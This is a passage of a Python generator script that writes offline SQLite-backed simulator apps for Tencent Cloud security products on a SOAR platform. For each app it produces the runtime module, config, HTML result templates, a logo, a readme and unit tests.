        "status": action_def.get("result_status") or params.get("status") or "active",
        "severity": params.get("severity") or "medium",
        "summary": params.get("summary") or action_def["description"],
        "data": details,
    }
    _insert_record(conn, record)
    created = next(item for item in _all_records(conn) if item["id"] == record_id)
    operation = _log_operation(
        conn,
        action_name,
        params,
        action_def,
        status=created["status"],
        details={"latency_seconds": latency, "created_id": record_id},
    )
    return _response(
        data={
            "result": "模拟记录创建成功",
            "record": created,
            "records": [created],
            "created_id": record_id,
            "operation": operation,
            "affected_count": 1,
        }
    )


def _delete_record(conn, action_name, params, assets, action_def):
    latency = _simulate_latency(assets)
    matches = [
        record
        for record in _all_records(conn)
        if _matches(record, params, action_def)
    ]
    if not matches:
        return _response(
            404,
            "未找到匹配记录",
            {"result": "record_not_found", "affected_count": 0},
        )
    ids = [record["id"] for record in matches]
    conn.executemany("DELETE FROM records WHERE id = ?", [(item,) for item in ids])
    conn.commit()
    operation = _log_operation(
        conn,
        action_name,
        params,
        action_def,
        status="deleted",
        details={"latency_seconds": latency, "deleted_ids": ids},
    )
    return _response(
        data={
            "result": f"模拟记录删除完成，影响 {len(matches)} 条记录",
            "deleted_records": matches,
            "records": matches,
            "operation": operation,
            "affected_count": len(matches),
        }
    )


def _operation_history(conn, params):
    clauses = []
    values = []
    if params.get("trace_id"):
        clauses.append("trace_id = ?")
        values.append(str(params["trace_id"]))
    if params.get("target"):
        clauses.append("(target LIKE ? OR policy_id LIKE ?)")
        value = f"%{params['target']}%"
        values.extend([value, value])
    where = f"WHERE {' AND '.join(clauses)}" if clauses else ""
    values.append(_limit(params))
    rows = conn.execute(
        f"SELECT * FROM operations {where} ORDER BY timestamp DESC LIMIT ?",
        values,
    ).fetchall()
    records = []
    for row in rows:
        record = dict(row)
        record["details"] = _parse_json(record.get("details"))
        records.append(record)
    return _response(
        data={
            "result": f"查询到 {len(records)} 条操作审计记录",
            "records": records,
            "history_records": records,
            "total_count": len(records),
        }
    )


def _execute(action_name, params, assets, context_info):
    action_def = _definition(action_name)
    if not action_def:
        return _response(404, f"未知动作: {action_name}", {"result": "action_not_found"})
    params = _apply_defaults(params, action_def)
    invalid = _validate_required(params, action_def)
    if invalid:
        return invalid
    operation = action_def.get("operation") or "query"
    if operation == "health":
        return _health(assets)
    unavailable = _availability_error(assets)
    if unavailable:
        return unavailable
    conn = None
    try:
        conn = _connect(assets)
        if operation == "query":
            return _query(conn, params, action_def)
        if operation == "create_policy":
            return _create_policy(conn, action_name, params, assets, action_def)
        if operation == "release_policy":
            return _release_policy(conn, action_name, params, assets, action_def)
        if operation == "expire_policies":
            return _expire_policies(conn, action_name, params, assets, action_def)
        if operation == "update_record":
            return _update_record(conn, action_name, params, assets, action_def)
        if operation == "create_record":
            return _create_record(conn, action_name, params, assets, action_def)
        if operation == "delete_record":
            return _delete_record(conn, action_name, params, assets, action_def)
        if operation == "history":
            return _operation_history(conn, params)
        return _response(500, f"未实现的操作类型: {operation}", {"result": "operation_not_supported"})
    except Exception as exc:
        return _response(500, str(exc), {"result": f"{action_name} 执行失败: {exc}"})
    finally:
        if conn is not None:
            conn.close()


$FUNCTIONS
''')


def build_module(spec):
    functions = "\n\n\n".join(
        f'''def {item["action"]}(params, assets, context_info):
    """{item["description"]}"""
    return _execute({item["action"]!r}, params, assets, context_info)'''
        for item in spec["actions"]
    )
    return RUNTIME_TEMPLATE.substitute(
        APP_NAME=repr(spec["name"]),
        PRODUCT_NAME=repr(spec["product_name"]),
        APP_DESCRIPTION=repr(spec["description"]),
        APP_VERSION=repr(VERSION),
        DEFAULT_RECORDS=repr(json.dumps(spec["records"], ensure_ascii=False)),
        ACTION_DEFINITIONS=repr(json.dumps(spec["actions"], ensure_ascii=False)),
        HEALTH_COMPONENTS=repr(json.dumps(spec["health_components"], ensure_ascii=False)),
        FUNCTIONS=functions,
    )


def build_config(spec):
    configuration = {
        "database_path": {
            "data_type": "string",
            "description": "SQLite 模拟状态库路径",
            "default_value": f"/tmp/{spec['name']}.db",
            "required": False,
            "order": 0,
        },
        "scenario_profile": {
            "data_type": "string",
            "description": "模拟场景名称",
            "default_value": "default",
            "required": False,
            "order": 1,
        },
        "delay_min_seconds": {
            "data_type": "integer",
            "description": "写动作最小模拟延迟秒数",
            "default_value": 1,
            "required": False,
            "order": 2,
        },
        "delay_max_seconds": {
            "data_type": "integer",
            "description": "写动作最大模拟延迟秒数",
            "default_value": 3,
            "required": False,
            "order": 3,
        },
        "simulated_api_status": {
            "data_type": "string",
            "description": "模拟 API 状态：healthy、degraded、unavailable",
            "default_value": "healthy",
            "required": False,
            "order": 4,
        },
        "simulated_auth_status": {
            "data_type": "string",
            "description": "模拟鉴权状态：authorized、forbidden",
            "default_value": "authorized",
            "required": False,
            "order": 5,
        },
        "simulated_link_status": {
            "data_type": "string",
            "description": "模拟链路状态：healthy、delayed、down",
            "default_value": "healthy",
            "required": False,
            "order": 6,
        },
    }
    actions = []
    for index, item in enumerate(spec["actions"]):
        operation = item["operation"]
        outputs = [
            {"data_path": "action_result.code", "data_type": "integer", "description": "状态码"},
            {"data_path": "action_result.data.result", "data_type": "string", "description": "动作结果"},
        ]
        if operation == "health":
            outputs.append(
                {
                    "data_path": "action_result.data.system_info",
                    "data_type": "jsonobject",
                    "description": "产品和链路健康状态",
                }
            )
        elif operation in ("create_policy", "release_policy", "expire_policies"):
            outputs.extend(
                [
                    {
                        "data_path": "action_result.data.policy_id",
                        "data_type": "string",
                        "description": "策略 ID",
                    },
                    {
                        "data_path": "action_result.data.policy",
                        "data_type": "jsonobject",
                        "description": "策略详情",
                    },
                    {
                        "data_path": "action_result.data.operation",
                        "data_type": "jsonobject",
                        "description": "审计操作信息",
                    },
                ]
            )
        else:
            outputs.extend(
                [
                    {
                        "data_path": "action_result.data.records",
                        "data_type": "jsonarray",
                        "description": "记录列表",
                    },
                    {
                        "data_path": "action_result.data.record",
                        "data_type": "jsonobject",
                        "description": "首条记录",
                    },
                    {
                        "data_path": "action_result.data.total_count",
                        "data_type": "integer",
                        "description": "记录数量",
                    },
                    {
                        "data_path": "action_result.data.operation",
                        "data_type": "jsonobject",
                        "description": "审计操作信息",
                    },
                ]
            )
        actions.append(
            {
                "order": index,
                "action": item["action"],
                "class_name": item["action"],
                "description": item["description"],
                "result_display_tmpt_type": "js",
                "result_display_tmpt": f"shakespeare-action-template/{item['action']}.art",
                "safe_mode": False,
                "is_test": item["action"] == "health_check",
                "classify": item["classify"],
                "parameters": item["parameters"],
                "output": outputs,
            }
        )
    return {
        "name": spec["name"],
        "description": spec["description"],
        "app_version": VERSION,
        "jar": f"{spec['module']}.py",
        "readme": "resources/readme.md",
        "logo": f"resources/{spec['name']}_logo.svg",
        "category": spec["category"],
        "product_name": spec["product_name"],
        "app_supplier": SUPPLIER,
        "logic_language": "PYTHON",
        "min_shakespeare_version": "1.0",
        "logic_language_version": "3",
        "has_test": True,
        "test_action": "health_check",
        "resources": "",
        "configuration": configuration,
        "actions": actions,
    }


def build_logo(spec):
    background, accent = spec["colors"]
    return f'''<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" role="img" aria-label="{spec["product_name"]}">
  <rect width="512" height="512" rx="64" fill="{background}"/>
  <path d="M256 54 408 120v112c0 101-62 184-152 228-90-44-152-127-152-228V120L256 54Z" fill="{accent}"/>
  <path d="M256 96 366 144v86c0 73-42 134-110 171-68-37-110-98-110-171v-86l110-48Z" fill="#ffffff" opacity="0.96"/>
  <circle cx="256" cy="242" r="82" fill="{background}"/>
  <text x="256" y="276" text-anchor="middle" font-family="Arial, sans-serif" font-size="104" font-weight="700" fill="#ffffff">{spec["letter"]}</text>
  <rect x="176" y="354" width="160" height="54" rx="8" fill="{background}"/>
  <text x="256" y="391" text-anchor="middle" font-family="Arial, sans-serif" font-size="30" font-weight="700" fill="#ffffff">SIM</text>
</svg>
'''


def build_template(spec, item):
    title = f"{spec['product_name']} - {item['description']}"
    return f'''<div class="ant-table ant-table-default ant-table-bordered">
  <div class="ant-table-content"><div class="ant-table-body">
    {{{{each action_results action_result}}}}
    <h3 style="color:#0052d9;margin:0 0 8px;">{title}</h3>
    <div style="padding:10px;background:#f6ffed;margin-bottom:12px;">
      <strong>执行结果：</strong>
      {{{{if action_result.code == 200}}}}<span style="color:#389e0d;">{{{{action_result.data.result || action_result.data.msg || "成功"}}}}</span>
      {{{{else}}}}<span style="color:#cf1322;">{{{{action_result.msg}}}}</span>{{{{/if}}}}
    </div>

    {{{{if action_result.data.system_info}}}}
    <table style="margin-bottom:12px;"><thead class="ant-table-thead"><tr><th>产品</th><th>API</th><th>鉴权</th><th>链路</th><th>记录</th><th>策略</th><th>状态库</th></tr></thead>
      <tbody class="ant-table-tbody"><tr><td>{{{{action_result.data.system_info.product}}}}</td><td>{{{{action_result.data.system_info.api_status}}}}</td><td>{{{{action_result.data.system_info.auth_status}}}}</td><td>{{{{action_result.data.system_info.link_status}}}}</td><td>{{{{action_result.data.system_info.record_count}}}}</td><td>{{{{action_result.data.system_info.policy_count}}}}</td><td><code>{{{{action_result.data.system_info.database_path}}}}</code></td></tr></tbody>
    </table>{{{{/if}}}}

    {{{{if action_result.data.policy}}}}
    <table style="margin-bottom:12px;"><thead class="ant-table-thead"><tr><th>策略 ID</th><th>目标</th><th>状态</th><th>到期时间</th><th>trace_id</th><th>操作者</th></tr></thead>
      <tbody class="ant-table-tbody"><tr><td><code>{{{{action_result.data.policy.id}}}}</code></td><td>{{{{action_result.data.policy.target || action_result.data.policy.ip}}}}</td><td>{{{{action_result.data.policy.status}}}}</td><td>{{{{action_result.data.policy.expires_at || "永久"}}}}</td><td><code>{{{{action_result.data.policy.trace_id || "-"}}}}</code></td><td>{{{{action_result.data.policy.operator || action_result.data.policy.owner}}}}</td></tr></tbody>
    </table>{{{{/if}}}}

    {{{{if action_result.data.operation}}}}
    <table style="margin-bottom:12px;"><thead class="ant-table-thead"><tr><th>操作 ID</th><th>动作</th><th>目标</th><th>状态</th><th>trace_id</th><th>触发源</th></tr></thead>
      <tbody class="ant-table-tbody"><tr><td><code>{{{{action_result.data.operation.operation_id}}}}</code></td><td>{{{{action_result.data.operation.action}}}}</td><td>{{{{action_result.data.operation.target}}}}</td><td>{{{{action_result.data.operation.status}}}}</td><td><code>{{{{action_result.data.operation.trace_id || "-"}}}}</code></td><td>{{{{action_result.data.operation.trigger_source}}}}</td></tr></tbody>
    </table>{{{{/if}}}}

    {{{{if action_result.data.records && action_result.data.records.length > 0}}}}
    <table><thead class="ant-table-thead"><tr><th>ID</th><th>类型</th><th>名称</th><th>源 IP</th><th>目的 IP</th><th>资产/业务</th><th>负责人</th><th>状态</th><th>等级</th><th>置信度</th><th>trace_id</th><th>摘要</th></tr></thead>
      <tbody class="ant-table-tbody">{{{{each action_result.data.records record}}}}<tr>
        <td><code>{{{{record.id}}}}</code></td><td>{{{{record.kind}}}}</td><td>{{{{record.name}}}}</td><td>{{{{record.src_ip || record.ip || "-"}}}}</td><td>{{{{record.dst_ip || "-"}}}}</td><td>{{{{record.asset_id || record.business_id || "-"}}}}</td><td>{{{{record.owner || record.owner_account || "-"}}}}</td><td>{{{{record.status}}}}</td><td>{{{{record.severity}}}}</td><td>{{{{record.confidence || "-"}}}}</td><td><code>{{{{record.trace_id || "-"}}}}</code></td><td>{{{{record.summary}}}}</td>
      </tr>{{{{/each}}}}</tbody>
    </table>{{{{else if action_result.data.total_count == 0}}}}<div style="padding:20px;text-align:center;color:#8c8c8c;">没有匹配记录</div>{{{{/if}}}}
    {{{{/each}}}}
  </div></div>
</div>
'''


def sample_text(item):
    if not item["sample"]:
        return "-"
    return "`" + json.dumps(item["sample"], ensure_ascii=False, separators=(",", ":")) + "`"


def build_readme(spec):
    action_rows = "\n".join(
        f"| `{item['action']}` | {item['classify']} | {sample_text(item)} | {item['description']} |"
        for item in spec["actions"]
    )
    record_rows = "\n".join(
        "| `{id}` | {kind} | {name} | {ip} | {owner} | {status} | {severity} | {summary} |".format(
            id=record["id"],
            kind=record["kind"],
            name=record["name"],
            ip=record.get("ip") or "-",
            owner=record.get("owner") or "-",
            status=record.get("status") or "-",
            severity=record.get("severity") or "-",
            summary=record.get("summary") or "-",
        )
        for record in spec["records"]
    )
    return f'''# {spec["product_name"]}

> 版本：v{VERSION}
> 类型：腾讯云安全产品离线模拟器
> 说明：本应用由雾帜智能提供，仅用于 SOAR 演示、培训和 PoC，不是腾讯云官方连接器。

## 应用简介

{spec["description"]}。应用不连接腾讯云，不需要 SecretId、SecretKey 或其他密钥。未配置 asset 资源时会使用内置 SQLite 和样例数据直接运行。

## 可选配置

- `database_path`：SQLite 状态库路径，默认 `/tmp/{spec["name"]}.db`
- `scenario_profile`：场景名称，默认 `default`
- `delay_min_seconds` / `delay_max_seconds`：写动作模拟延迟，默认 1-3 秒
- `simulated_api_status`：`healthy`、`degraded`、`unavailable`
- `simulated_auth_status`：`authorized`、`forbidden`
- `simulated_link_status`：`healthy`、`delayed`、`down`

## 联动字段契约

告警和调查动作优先返回 `alert_id`、`src_ip`、`dst_ip`、`host_ip`、`external_ip`、`asset_id`、`host_id`、`business_id`、`owner`、`severity`、`confidence`、`trace_id`。策略写动作返回 `policy_id`、`status`、`expires_at`、`operator`、`trigger_source`、`trace_id` 和 `operation`。

## 动作列表

| 动作 | 类型 | 示例参数 | 说明 |
|---|---|---|---|
{action_rows}

## 内置样例数据

| ID | 类型 | 名称 | IP | 负责人 | 状态 | 等级 | 摘要 |
|---|---|---|---|---|---|---|---|
{record_rows}

## 安全约束

- app 只模拟产品能力；白名单、置信度阈值、人工审批和多产品选择应由 SOAR 剧本负责。
- 写动作统一记录操作者、触发来源、trace_id、策略 ID、TTL 和执行结果。
- `simulated_api_status` 和 `simulated_auth_status` 可用于演示 API 不可用、权限不足、失败重试和人工补偿分支。
'''


def build_test(spec):
    imports = ", ".join(item["action"] for item in spec["actions"])
    cases = json.dumps(
        [(item["action"], item["sample"]) for item in spec["actions"]],
        ensure_ascii=False,
        indent=4,
    )
    policy_actions = [
        item for item in spec["actions"] if item["operation"] == "create_policy"
    ]
    required_actions = [
        item
        for item in spec["actions"]
        if any(
            metadata.get("required")
            for metadata in item.get("parameters", {}).values()
        )
    ]
    policy_test = ""
    if policy_actions:
        item = policy_actions[0]
        policy_test = f'''
    def test_policy_action_returns_audit_contract(self):
        result = {item["action"]}({item["sample"]!r}, self.assets, {{}})
        self.assertEqual(result["code"], 200)
        self.assertTrue(result["data"]["policy_id"])
        self.assertEqual(
            result["data"]["operation"]["trace_id"],
            {item["sample"].get("trace_id", "")!r},
        )
        self.assertIn("expires_at", result["data"]["policy"])
'''
    required_test = ""
    if required_actions:
        item = required_actions[0]
        required_test = f'''
    def test_required_parameter_validation(self):
        result = {item["action"]}({{}}, self.assets, {{}})
        self.assertEqual(result["code"], 400)
        self.assertTrue(result["data"]["missing_parameters"])
'''
    return f'''# -*- coding: utf-8 -*-
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(__file__))

from {spec["module"]} import {imports}


ACTION_CASES = {cases}


class Test{spec["name"].title().replace("_", "")}(unittest.TestCase):
    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.assets = {{
            "database_path": os.path.join(self.tempdir.name, "{spec["name"]}.db"),
            "delay_min_seconds": 0,
            "delay_max_seconds": 0,
        }}

    def tearDown(self):
        self.tempdir.cleanup()

    def test_health_and_none_assets_compatibility(self):
        self.assertEqual(health_check({{}}, self.assets, {{}})["code"], 200)
        self.assertEqual(health_check({{}}, None, {{}})["code"], 200)

    def test_all_actions_execute(self):
        for action_name, params in ACTION_CASES:
            with self.subTest(action=action_name):
                result = globals()[action_name](params, self.assets, {{}})
                self.assertEqual(result["code"], 200, result)
                self.assertIn("data", result)

    def test_simulated_api_failure_is_distinguishable(self):
        unavailable = dict(self.assets)
        unavailable["simulated_api_status"] = "unavailable"
        result = health_check({{}}, unavailable, {{}})
        self.assertEqual(result["code"], 503)
        self.assertEqual(result["data"]["system_info"]["api_status"], "unavailable")

{required_test}
{policy_test}

if __name__ == "__main__":
    unittest.main()
'''


def write_file(path, content):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def generate_app(spec):
    app_dir = ROOT / f"shakespeare-action-python-{spec['name']}"
    write_file(
        app_dir / "config.json",
        json.dumps(build_config(spec), ensure_ascii=False, indent=4) + "\n",
    )
    write_file(app_dir / f"{spec['module']}.py", build_module(spec))
    write_file(app_dir / f"test_{spec['module']}.py", build_test(spec))
    write_file(app_dir / "resources" / "readme.md", build_readme(spec))
    write_file(
        app_dir / "resources" / f"{spec['name']}_logo.svg",
        build_logo(spec),
    )
    for item in spec["actions"]:
        write_file(
            app_dir / "shakespeare-action-template" / f"{item['action']}.art",
            build_template(spec, item),
        )


def main():
    for spec in APP_SPECS:
        generate_app(spec)
    print(f"Generated {len(APP_SPECS)} Tencent Cloud security simulator apps.")


if __name__ == "__main__":
    main()
